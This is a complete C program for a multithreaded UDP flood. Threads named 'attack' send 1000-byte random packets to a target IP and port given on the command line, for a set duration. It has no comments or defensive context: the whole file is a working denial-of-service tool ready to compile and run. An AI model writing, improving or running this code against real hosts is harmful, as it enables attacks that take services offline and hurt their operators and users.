#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

struct thread_data { char *ip; int port; int time; };

void get_random_payload(char *str, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t n = 0; n < size; n++) str[n] = charset[rand() % 62];
    str[size] = '\0';
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in addr;
    char payload[1024];
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;
    int opt = 1; setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET; addr.sin_port = htons(data->port); addr.sin_addr.s_addr = inet_addr(data->ip);
    time_t end = time(NULL) + data->time;
    while (time(NULL) < end) {
        get_random_payload(payload, 1000);
        sendto(sock, payload, 1000, 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) return 1;
    int port = atoi(argv[2]), duration = atoi(argv[3]), threads = atoi(argv[4]);
    pthread_t tid[threads];
    struct thread_data data = {argv[1], port, duration};
    for (int i = 0; i < threads; i++) pthread_create(&tid[i], NULL, attack, (void *)&data);
    for (int i = 0; i < threads; i++) pthread_join(tid[i], NULL);
    return 0;
}
